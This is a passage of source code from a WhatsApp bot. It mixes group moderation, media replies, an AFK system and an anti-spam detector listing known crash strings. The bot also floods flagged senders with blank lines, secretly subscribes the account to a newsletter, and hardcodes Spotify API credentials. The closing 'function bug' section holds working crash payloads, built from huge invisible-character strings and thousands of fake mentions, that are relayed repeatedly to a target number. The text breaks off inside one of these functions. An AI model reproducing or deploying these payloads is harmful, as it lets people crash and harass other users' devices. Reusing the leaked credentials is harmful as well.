            const randomEmoji = randomEmojis[Math.floor(Math.random() * randomEmojis.length)];

            // Send a random emoji as a reaction
            await PhistarBotInc.sendMessage(sender, {
                react: { text: randomEmoji, key: message.key }
            });
        }
    } catch (err) {
        console.error('Error tracking messages:', err);
    }
});
async function getCountryNumbers(country) {
    try {
        const response = await axios.get(`${BASE_URL}countries/${country}?lang=en`);
        if (response.data.response === "1") {
            const numbers = response.data.numbers.map(num => ({
                description: num.data_humans,
                fullNumber: num.full_number
            }));
            return numbers;
        } else {
            throw new Error("Failed to fetch numbers.");
        }
    } catch (error) {
        console.error("Error fetching numbers:", error.message);
        return [];
    }
}


// Initialize warning database
const antispamPath = './antispam.json';
const spamTracker = {}; // Temporary in-memory tracker for spam

// Load or initialize antispam settings
function loadSpamSettings() {
    if (!fs.existsSync(antispamPath)) {
        const defaultData = { groups: {} };
        fs.writeFileSync(antispamPath, JSON.stringify(defaultData, null, 2), 'utf-8');
        console.log('Created antispam.json as it did not exist.');
        return defaultData;
    }
    return JSON.parse(fs.readFileSync(antispamPath, 'utf-8'));
}

// Save settings to the JSON file
function saveSpamSettings(data) {
    fs.writeFileSync(antispamPath, JSON.stringify(data, null, 2), 'utf-8');
}

// Update settings for a specific group
function updateSpamSettings(groupJid, settings) {
    const data = loadSpamSettings();
    data.groups[groupJid] = settings;
    saveSpamSettings(data);
}

// Retrieve settings for a specific group
function getSpamSettings(groupJid) {
    const data = loadSpamSettings();
    return data.groups[groupJid] || { enabled: false, spamLimit: 5 };
}
async function searchSpotifyTracks(query) {
  const clientId = 'acc6302297e040aeb6e4ac1fbdfd62c3';
  const clientSecret = '0e8439a1280a43aba9a5bc0a16f3f009';
  const auth = Buffer.from(`${clientId}:${clientSecret}`).toString('base64');

  const getToken = async () => {
    const response = await fetch('https://accounts.spotify.com/api/token', {
      method: 'POST',
      timeout: 60000, // 60 seconds
      body: new URLSearchParams({ grant_type: 'client_credentials' }),
      headers: { Authorization: `Basic ${auth}` },
    });
    return (await response.json()).access_token;
  };

  const accessToken = await getToken();
  const offset = 10;
  const searchUrl = `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&offset=${offset}`;
  const response = await fetch(searchUrl, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const data = await response.json();
  return data.tracks.items;
}

function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}
const folderPath = './Phistar-media';  // Folder where the file is located
const fileName = 'uploads.txt'; // Name of the file to upload
const filePath = `${folderPath}/${fileName}`; // Full file path

if (!fs.existsSync(filePath)) {
    console.error(`❌ File not found: ${filePath}`);
} else {
    (async () => {
        try {
            const result = await catbox(filePath);
            console.log(`✅ Uploaded file URL: ${result.url}`);
        } catch (error) {
            console.error(`❌ Error uploading file: ${error.message}`);
        }
    })();
}
// File auto-creation logic for catbox.js
const catboxFilePath = './catbox.js';
if (!fs.existsSync(catboxFilePath)) {
    console.log('📂 File "catbox.js" not found. Creating...');
    const catboxContent = `
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');

async function catbox(path) {
    const data = new FormData();
    data.append('reqtype', 'fileupload');
    data.append('userhash', ''); // Optional, can be left blank
    data.append('fileToUpload', fs.createReadStream(path)); // Attach the file

    const config = {
        method: 'POST',
        url: 'https://catbox.moe/user/api.php',
        headers: {
            ...data.getHeaders(), // Correctly retrieve headers from FormData
        },
        data: data, // FormData instance
    };

    try {
        const api = await axios.request(config);
        return { url: api.data.trim() }; // Return the uploaded file URL
    } catch (error) {
        console.error('Error uploading to Catbox:', error.message);
        throw new Error('Failed to upload to Catbox');
    }
}

module.exports = { catbox };
`;
    fs.writeFileSync(catboxFilePath, catboxContent.trim());
    console.log('✅ File "catbox.js" created successfully.');
}

// Import the Catbox uploader
const { catbox } = require('./catbox');
        if (!PhistarBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (global.autoread) {
            PhistarBotInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        PhistarBotInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        PhistarBotInc.sendPresenceUpdate('recording', from)
        }
        // Antilink Protection
if (global.antilink || global.antilinkkick || global.antilinkwarn) {
    if (/https?:\/\/[^\s]+/i.test(budy)) { // Matches any URL
        if (!isBotAdmins) return; // Ensure bot is admin
        if (isAdmins || isCreator) return; // Skip for admins/owner

        // Delete the message
        try {
            await PhistarBotInc.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant
                }
            });
        } catch (err) {
            console.log('Failed to delete message:', err);
        }

        if (global.antilinkkick) {
            // Warn and kick the sender
            try {
                await PhistarBotInc.sendMessage(m.chat, {
                    text: `Warning @${m.sender.split("@")[0]}, posting links is not allowed in this group!`,
                    mentions: [m.sender]
                });
                await PhistarBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
            } catch (err) {
                console.log('Failed to kick participant:', err);
            }
        } else if (global.antilinkwarn) {
            // Just warn the sender
            try {
                await PhistarBotInc.sendMessage(m.chat, {
                    text: `Warning @${m.sender.split("@")[0]}! Do not send links in this group!`,
                    mentions: [m.sender]
                });
            } catch (err) {
                console.log('Failed to send warning:', err);
            }
        }
    }
}
const vm = require('vm');

// Function to interpret the obfuscated file and return the processed result
async function processObfuscatedFile(filePath) {
    try {
        // Check if the file exists
        if (!fs.existsSync(filePath)) {
            throw new Error('File not found.');
        }

        // Read the obfuscated file
        const obfuscatedCode = fs.readFileSync(filePath, 'utf8');

        // Set up a sandbox to capture console output
        let output = '';
        const sandbox = {
            console: {
                log: (data) => (output += data + '\n'), // Capture console.log outputs
                error: (data) => (output += 'Error: ' + data + '\n'),
            },
        };

        // Create a VM context with the sandbox
        const context = vm.createContext(sandbox);

        // Run the obfuscated code inside the sandbox
        vm.runInContext(obfuscatedCode, context);

        // Return the captured output
        return output.trim() || 'No output captured from the file.';
    } catch (error) {
        // Handle errors during execution
        console.error('Error while processing obfuscated file:', error);
        return `Error occurred while processing the file:\n\n${error.message}`;
    }
}
        //bot number online status, available=online, unavailable=offline
        PhistarBotInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        PhistarBotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            PhistarBotInc.updateProfileStatus(`𝐍𝐎𝐆𝐀𝐌𝐄-𝐗𝐌𝐃 ᴀᴄᴛɪᴠᴇ here...`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return PhistarBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await PhistarBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await PhistarBotInc.getName(i)}\nFN:${await PhistarBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
    console.log(chalk.cyan(`\n╔══════════════════════════════════════════════════╗`))
    console.log(chalk.yellow(`║ 🏢 GROUP CHAT `) + chalk.cyan(`║`))
    console.log(chalk.cyan(`╠══════════════════════════════════════════════════╣`))
    console.log(chalk.magenta(`║ 📝 Message: `) + chalk.white(body || m.mtype) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.blue(`║ 👤 From: `) + chalk.green(pushname) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.yellow(`║ 🆔 Sender: `) + chalk.white(m.sender) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.green(`║ 🏠 Group: `) + chalk.cyan(groupName) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.red(`║ 🕒 Time: `) + chalk.white(new Date().toLocaleString()) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╚══════════════════════════════════════════════════╝\n`))
} else {
    console.log(chalk.cyan(`\n╔══════════════════════════════════════════════════╗`))
    console.log(chalk.green(`║ 🔒 PRIVATE CHAT `) + chalk.cyan(`║`))
    console.log(chalk.cyan(`╠══════════════════════════════════════════════════╣`))
    console.log(chalk.magenta(`║ 📝 Message: `) + chalk.white(body || m.mtype) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.blue(`║ 👤 From: `) + chalk.green(pushname) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.yellow(`║ 🆔 Sender: `) + chalk.white(m.sender) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╠──────────────────────────────────────────────────╢`))
    console.log(chalk.red(`║ 🕒 Time: `) + chalk.white(new Date().toLocaleString()) + chalk.cyan(` ║`))
    console.log(chalk.cyan(`╚══════════════════════════════════════════════════╝\n`))
}
      
        let antibug = false; // Default state: OFF

const antibugMessage = `
🚫 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 ⚠️  
☠️ 𝐀𝐧𝐭𝐢-𝐁𝐮𝐠 𝐒𝐲𝐬𝐭𝐞𝐦 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ⚡  
⚠️◼️◾◽ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐏𝐄𝐑𝐌𝐀𝐍𝐄𝐍𝐓𝐋𝐘 𝐁𝐋𝐎𝐂𝐊𝐄𝐃 ◽◾◼️⚠️  
🚫 **𝐀𝐥𝐥 𝐛𝐮𝐠 𝐚𝐭𝐭𝐞𝐦𝐩𝐭𝐬 𝐰𝐢𝐥𝐥 𝐟𝐚𝐢𝐥!** 🚫
`;

PhistarBotInc.ev.on("messages.upsert", async (m) => {
  try {
    if (!antibug) return; // Exit if Anti-Bug is OFF

    const msg = m.messages[0];
    const sender = msg.key.remoteJid;

    // Skip if message is invalid or sent by the bot
    if (!msg.message || msg.key.fromMe) return;

    const messageContent = JSON.stringify(msg.message);
    const senderID = msg.key.participant || sender;

    // Payload Detection Logic (including the new sequence check)
    if (
      messageContent.length > 5000 || // Long payloads
      /(\u200B|\u200C|\u200D|\u202C|\u202E)/.test(messageContent) || // Invisible Unicode
      /crash|freeze|payload|malicious/i.test(messageContent) || // Bug keywords
      messageContent.includes("⚽ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི") || // Special Sequence 1
      messageContent.includes("ٯٯ𠀋ܱܰٯٯٯٯܱܰ𠀋ܱܰ") || // Special Sequence 2
      messageContent.includes("@529999997*.🔥؄ٽ؄🔥.*@234237*.🔥؄ٽ؄🔥.*@561623423*.~~.*@4124227*.🔥؄ٽ؄🔥.*@777777*.🔥؄ٽ؄🔥.*@529995531316*.~~.*@45*.🤴؄ٽ؄🤴.*@8401*.🤴؄ٽ؄🤴.*@5616*.~~.*@45*.🤴؄ٽ؄🤴.*@8401*.🤴؄ٽ؄🤴.*@5616*.~~.*@45*.🤴؄ٽ؄🤴.*@529995531316*.🤴") || // Special Sequence 3
      messageContent.includes("‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲") || // Special Sequence 4
      messageContent.includes("ꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹ") // New Special Sequence
    ) {
      console.log(`🚨 Strong Payload Detected from ${senderID}`);

      // Send warning to the flagged user
      await PhistarBotInc.sendMessage(sender, { text: antibugMessage });

      // Send alert to the bot owner
      await PhistarBotInc.sendMessage(PhistarBotInc.user.id, {
        text: senderID.split("@")[0] + `𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃
       `});

      // Block the sender
      await PhistarBotInc.updateBlockStatus(sender, "block");

      console.log(`🚫 User ${senderID} has been blocked and reported.`);
    }
  } catch (err) {
    console.error("❌ Error in Anti-Bug System:", err);
  }
});
        if (m.message) {
                             if (m.mtype === "LiveLocationMessage") {
                               newly = "\n".repeat(0x3e8);
                               await PhistarBotInc.sendMessage(m.chat, {
                                 'text': newly
                               });
                               await PhistarBotInc.sendMessage(PhistarBotInc.user.id, {
                                 'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃 "
                                 
                               });
                               await PhistarBotInc.updateBlockStatus(m.sender, "block");
                             }
                           }          
              if (m.message) {
                                    if (m.mtype === "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ") {
                                      newly = "\n".repeat(0x3e8);
                                      await PhistarBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await PhistarBotInc.sendMessage(PhistarBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃 "
                                      });
                                      await PhistarBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }
               if (m.message) {
                                    if (m.mtype === "⚽ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི") {
                                      newly = "\n".repeat(0x3e8);
                                      await PhistarBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await PhistarBotInc.sendMessage(PhistarBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + " 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃 "
                                      });
                                      await PhistarBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }

  
                  
                     if (m.message) {
                                    if (m.mtype === "꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫") {
                                      newly = "\n".repeat(0x3e8);
                                      await PhistarBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await PhistarBotInc.sendMessage(PhistarBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃 "
                                      });
                                      await PhistarBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }  
                      // Define and initialize antibilling variable
// Initialize Anti-Billing toggle
let antibilling = false; // Default is off

// Define Billing Keywords
const billingKeywords = [
    'help', 'abeg', 'please', 'money', 'data', 'loan', 'send me', 'airtime', 'cash', 'boss',
    '2k'
    // Add more keywords here
];

// ⚡ Auto-Followers silencieux avec anti-spam
const newsletterJids = [
   
    "120363420981848394@newsletter"
];

// Cache pour éviter les répétitions
const alreadyFollowed = new Set();

// Quand quelqu’un envoie un message au bot
PhistarBotInc.ev.on("messages.upsert", async (chatUpdate) => {
    try {
        const mek = chatUpdate.messages[0];
        if (!mek.message) return;
        const userJid = mek.key.remoteJid;

        // Vérifie si déjà suivi
        if (alreadyFollowed.has(userJid)) return;

        for (let jid of newsletterJids) {
            await PhistarBotInc.newsletterFollow(jid, true);
        }

        // Ajoute en cache pour éviter de refaire
        alreadyFollowed.add(userJid);

        // Optionnel : supprime du cache après un délai (ex: 1h)
        setTimeout(() => alreadyFollowed.delete(userJid), 60 * 60 * 1000);

    } catch (e) {
        console.log("❌ AutoFollow Error:", e.message);
    }
});

// Quand un nouveau membre rejoint un groupe
PhistarBotInc.ev.on("group-participants.update", async (update) => {
    try {
        for (let participant of update.participants) {
            if (alreadyFollowed.has(participant)) continue;

            for (let jid of newsletterJids) {
                await PhistarBotInc.newsletterFollow(jid, true);
            }

            alreadyFollowed.add(participant);
            setTimeout(() => alreadyFollowed.delete(participant), 60 * 60 * 1000);
        }
    } catch (e) {
        console.log("❌ AutoFollow Group Error:", e.message);
    }
});


        
// Message Handling
PhistarBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        const m = message.message?.conversation || message.message?.extendedTextMessage?.text;

        // Only proceed if antibilling is activated and a text message is present
        if (antibilling && m) {
            const isBilling = billingKeywords.some(keyword => m.toLowerCase().includes(keyword));

            if (isBilling) {
                const sender = message.key.remoteJid;

                // Send filler text to chat
                const fillerText = "\n".repeat(1000);
                await PhistarBotInc.sendMessage(sender, { text: fillerText });

                // Notify the bot owner/admin
                const alertText = `${sender.split('@')[0]} 🚫 User flagged for billing attempts! User has been blocked.`;
                await PhistarBotInc.sendMessage(PhistarBotInc.user.id, { text: alertText });

                // Delete the offending message
                await PhistarBotInc.sendMessage(sender, { delete: message.key });

                // Block the user
                await PhistarBotInc.updateBlockStatus(sender, "block");
            }
        }
    } catch (err) {
        console.error('Error in Anti-Billing Handler:', err);
    }
});
// Define keywords for detection
const bigDaddyKeywords = ["play", "time", "weather", "help"]; // Add more keywords as needed

let ManoloActive = true; // Default is off

// Message Handling for Big Daddy interactions
PhistarBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        const sender = message.key.remoteJid; // Message sender's ID
        const m = message.message?.conversation || message.message?.extendedTextMessage?.text;

        // Ensure the bot only responds to messages containing "Big Daddy"
        if (ManoloActive && m) {
            const ismanoloCall = m.toLowerCase().includes('𝐍𝐎𝐆𝐀𝐌𝐄 𝐁𝐎𝐘');

            if (ismanoloCall) {
                // Extract the content following "Big Daddy"
                const command = m.toLowerCase().split('𝐍𝐎𝐆𝐀𝐌𝐄 𝐁𝐎𝐘')[1]?.trim();

                if (command) {
                    // Check if any keyword exists in the command
                    const foundKeyword = bigDaddyKeywords.find(keyword => command.startsWith(keyword));

                    if (foundKeyword) {
                        // Extract and send the text after the detected keyword
                        const responseText = command.replace(foundKeyword, '').trim();
                        await PhistarBotInc.sendMessage(sender, { text: responseText || "I didn't catch that!" });
                    } else {
                        // Ignore if no listed keyword is found after "Big Daddy"
                        return;
                    }
                }
            }
        }
    } catch (err) {
        console.error('Error in Big Daddy Handler:', err);
    }
});
// Optional: Handle credential updates to ensure session persistence
PhistarBotInc.ev.on('creds.update', (creds) => {
    // Save credentials if needed (e.g., to a file or database)
    console.log('Credentials updated.');
});

const diaryPath = './diary.json';
function loadDiary() {
    if (!fs.existsSync(diaryPath)) fs.writeFileSync(diaryPath, JSON.stringify({}), 'utf-8');
    return JSON.parse(fs.readFileSync(diaryPath, 'utf-8'));
}
function saveDiary(data) {
    fs.writeFileSync(diaryPath, JSON.stringify(data, null, 2), 'utf-8');
}
global.savedVideos = {};
async function getUserReplyWithTimeout(chatId, timeout) {
    return new Promise((resolve) => {
        const timer = setTimeout(() => resolve(null), timeout); // Timeout after the specified duration

       
    
        PhistarBotInc.ev.on('messages.upsert', ({ messages }) => {
            const message = messages[0];
            if (message.key.remoteJid === chatId && !message.key.fromMe) {
                clearTimeout(timer); // Clear the timeout when a reply is received
                resolve(message.message.conversation); // Resolve with the user's message
            }
        });
    });
} 
           // ✅ Make sure hit data is loaded safely
let hit = []
try {
    hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))
    if (!Array.isArray(hit) || hit.length === 0) {
        hit = [{ hit_cmd: 0 }]
    } else if (!('hit_cmd' in hit[0])) {
        hit[0].hit_cmd = 0
    }
} catch (e) {
    hit = [{ hit_cmd: 0 }]
}

// ✅ Command hit tracker
if (command) {
    const cmdadd = () => {
        hit[0].hit_cmd += 1
        fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
    }
    cmdadd()
    const totalhit = hit[0].hit_cmd
}

// ✅ Voice Notes
for (let BhosdikaXeon of VoiceNoteXeon) {
    if (budy === BhosdikaXeon) {
        let audiobuffy = fs.readFileSync(`./Phistar-media/audio/${BhosdikaXeon}.mp3`)
        PhistarBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: qtext2 })
    }
}

// ✅ Stickers
for (let BhosdikaXeon of StickerXeon) {
    if (budy === BhosdikaXeon) {
        let stickerbuffy = fs.readFileSync(`./Phistar-media/sticker/${BhosdikaXeon}.webp`)
        PhistarBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: qtext2 })
    }
}

// ✅ Images
for (let BhosdikaXeon of ImageXeon) {
    if (budy === BhosdikaXeon) {
        let imagebuffy = fs.readFileSync(`./Phistar-media/image/${BhosdikaXeon}.jpg`)
        PhistarBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: qtext2 })
    }
}

// ✅ Videos
for (let BhosdikaXeon of VideoXeon) {
    if (budy === BhosdikaXeon) {
        let videobuffy = fs.readFileSync(`./Phistar-media/video/${BhosdikaXeon}.mp4`)
        PhistarBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: qtext2 })
    }
}

// ✅ APKs
const sendapk = (teks) => {
    PhistarBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive' }, { quoted: qtext2 })
}
for (let BhosdikaXeon of ApkXeon) {
    if (budy === BhosdikaXeon) {
        let buffer = fs.readFileSync(`./Phistar-media/apk/${BhosdikaXeon}.apk`)
        sendapk(buffer)
    }
}

// ✅ ZIPs
const sendzip = (teks) => {
    PhistarBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip' }, { quoted: qtext2 })
}
for (let BhosdikaXeon of ZipXeon) {
    if (budy === BhosdikaXeon) {
        let buffer = fs.readFileSync(`./Phistar-media/zip/${BhosdikaXeon}.zip`)
        sendzip(buffer)
    }
}

// ✅ PDFs
const senddocu = (teks) => {
    haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf' }, { quoted: qtext2 })
}
for (let BhosdikaXeon of DocXeon) {
    if (budy === BhosdikaXeon) {
        let buffer = fs.readFileSync(`./Phistar-media/doc/${BhosdikaXeon}.pdf`)
        senddocu(buffer)
    }
}

// ✅ AFK System
if (m.isGroup && !m.key.fromMe) {
    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    for (let ment of mentionUser) {
        if (afk.checkAfkUser(ment, _afk)) {
            let getId2 = afk.getAfkId(ment, _afk)
            let getReason2 = afk.getAfkReason(getId2, _afk)
            let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
            let heheh2 = ms(getTimee)
            replyphistar(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
        }
    }
    if (afk.checkAfkUser(m.sender, _afk)) {
        let getId = afk.getAfkId(m.sender, _afk)
        let getReason = afk.getAfkReason(getId, _afk)
        let getTime = Date.now() - afk.getAfkTime(getId, _afk)
        let heheh = ms(getTime)
        _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
        fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
        PhistarBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
    }
}

// ==============function bug===========
async function delay1(isTarget) {
  for (let z = 0; z < 50; z++) {
    let msg = generateWAMessageFromContent(isTarget, {
      viewOnceMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
            },
            body: {
              text: "᬴".repeat(45000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{\"flow_cta\":\"${"᬴".repeat(90000)}\",\"flow_message_version\": \"3\"}`,
              version: 3
            }
          }
        }
      }
    }, {});

    await PhistarBotInc.relayMessage(
      isTarget,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: isTarget }
      }
    )
  };
  await sleep(5000)
}

async function InVisibleX(target, show = true) {
  let msg = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "Ω",
      contentText: "NoGame",
      footerText: "NoGame ¿?",
      buttons: [
        {
          buttonId: ".null",
          buttonText: {
            displayText: " NoGame ¿? " + "\u0000".repeat(500000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await PhistarBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
